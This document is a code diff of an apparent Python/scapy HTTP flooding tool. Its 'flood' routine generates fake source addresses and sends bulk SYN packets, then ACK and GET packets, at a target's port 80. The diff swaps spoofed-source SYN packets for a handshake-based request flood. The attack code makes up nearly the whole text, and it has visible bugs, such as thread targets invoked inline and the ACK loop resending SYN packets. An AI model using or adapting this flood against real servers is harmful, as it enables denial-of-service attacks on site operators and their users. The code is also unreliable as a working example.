@@ -15,27 +15,42 @@ def load_agents(name):
 def error(message):
         sys.exit(message)
 
-def better_send(pkt):
+def send_syn(pkt, synackpacketlist):
         try:
-                send(pkt, verbose = 0)
+            synack=sr1(pkt, verbose = 0)
+            synackpacketlist.append(synack)
         except:
                 error('Invalid FQDN address')
 
 
 
-def make(src, dst, alist):
+def makesyn(src, dst):
         IPlayer = IP()
         TCPlayer = TCP()
 
-        payload = f"GET / HTTP/1.1\r\nHost: {dst}\r\nAccept-Encoding: gzip, deflate\r\nUser-Agent: {choice(alist)}\r\n\r\n"
 
-        IPlayer.src = src
+        # IPlayer.src = src
         IPlayer.dst = dst
 
-        TCPlayer.sport = RandShort()
         TCPlayer.dport = 80
         TCPlayer.flags = 'S'
+        packet = IPlayer / TCPlayer
 
+        return packet
+
+def makeack(src, dst, synack):
+        IPlayer = IP()
+        TCPlayer = TCP()
+        # payload = f"GET / HTTP/1.1\r\nHost: {dst}\r\nAccept-Encoding: gzip, deflate\r\nUser-Agent: {choice(alist)}\r\n\r\n"
+        payload = f"GET / HTTP/1.1\r\nHost: {dst}\r\n\r\n"
+        # IPlayer.src = src
+        IPlayer.dst = dst
+
+        TCPlayer.dport = 80
+        TCPlayer.flags = 'A'
+        TCPlayer.sport=synack[TCP].dport
+        TCPlayer.seq=synack[TCP].ack
+        TCPlayer.ack=synack[TCP].seq + 1
         packet = IPlayer / TCPlayer / payload
 
         return packet
@@ -43,11 +58,13 @@ def make(src, dst, alist):
 def flood(dst, packets, alist):
         fake = Faker()
         addrs = []
-        packetlist = []
+        synpacketlist = []
+        synackpacketlist = []
+        ackpacketlist = []
 
         proctime = time.process_time()
 
-        print('making fake ip...')
+        print('generating fake ip...')
         for i in range(0, packets+1):
                 s = fake.ipv4()
                 addrs.append(s)
@@ -55,21 +72,34 @@ def flood(dst, packets, alist):
         proctime = time.process_time()-proctime
         print(f'Done in {proctime} sec')        
 
-        print('making packets...')
-        for addr in addrs:
-                s = make(addr, dst, alist)
-                packetlist.append(s)
+        print('crafting syn packets...')
+        for i in range(0, packets+1):
+                s = makesyn(addrs[i], dst)
+                synpacketlist.append(s)
 
         proctime = time.process_time()-proctime
         print(f'Done in {proctime} sec')       
 
-        print('sending packets...')
-        for pkt in packetlist:
-                s = threading.Thread(target= better_send(pkt))
+        print('sending syn packets...')
+        for i in range(0, packets+1):
+                s = threading.Thread(target= send_syn(synpacketlist[i], synackpacketlist))
                 s.start()
-
         proctime = time.process_time()-proctime
-        print(f'Done in {proctime} sec')        
+        print(f'Done in {proctime} sec') 
+
+        print('crafting ack packets...')
+        for i in range(0, packets+1):
+                ack = makeack(addrs[i], dst, synackpacketlist[i])
+                ackpacketlist.append(ack)
+        proctime = time.process_time()-proctime
+        print(f'Done in {proctime} sec')       
+
+        print('sending ack packets...')
+        for i in range(0, packets+1):
+                s = threading.Thread(target= send(synpacketlist[i], verbose = 0))
+                s.start()
+        proctime = time.process_time()-proctime
+        print(f'Done in {proctime} sec') 
 
 
 
